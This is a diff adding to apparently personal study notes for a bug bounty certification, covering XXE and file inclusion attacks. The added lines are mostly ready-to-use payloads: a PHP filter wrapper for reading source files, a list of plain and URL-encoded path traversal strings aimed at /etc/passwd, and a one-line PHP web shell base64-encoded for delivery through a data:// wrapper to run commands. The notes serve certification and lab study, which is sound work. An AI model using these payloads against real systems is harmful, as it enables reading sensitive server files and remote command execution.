@@ -189,6 +189,9 @@ Stuff for CBBH
 
     #When trying to read a local file with xxe attack in scg, if `file:///` doesn't work right away, try php filter `php://filter/convert.base64-encode/resource=index.php`
 
+    #This is another php wrapper when the another one fails
+    php://filter/read=convert.base64-encode/resource=
+
     #When trying to bypass extension filter, this method `blah.php.jpg` is valid one, but it doens't work try `blah.jpg.php`
 
 XXE attack 
@@ -239,6 +242,27 @@ XXE attack
       %oob;
     ]>
 
+FILE INCLUSION
 
+    #LFI -  Basic Bypasses
+    ....//....//....//....//etc/passwd
+    %2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc/passwd
+    %2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%65%74%63%2f%70%61%73%73%77%64
+    ..././..././..././..././etc/passwd
+    %2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2fetc/passwd
+    %2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%2e%2e%2e%2f%2e%2f%65%74%63%2f%70%61%73%73%77%64
+    ....////....////....////....////etc/passwd
+    %2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2fetc/passwd
+    %2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%2e%2e%2e%2e%2f%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64
+
+
+    #Check php.ini to see whether `allow_url_include` is enabled or not (/etc/php/7.4/apache2/php.ini).
+    #If it is enaled it might be possible to achieve RCE with the data wrapper
+    #See if you can load a url. If so, you might be able to achieve RCE through RFI
+    
+    echo '<?php system($_GET["cmd"]);   ?>' | base64 -w0
+    data://text/plain;base64,<BASE64-STRING>&cmd=id
+
+    
 
     
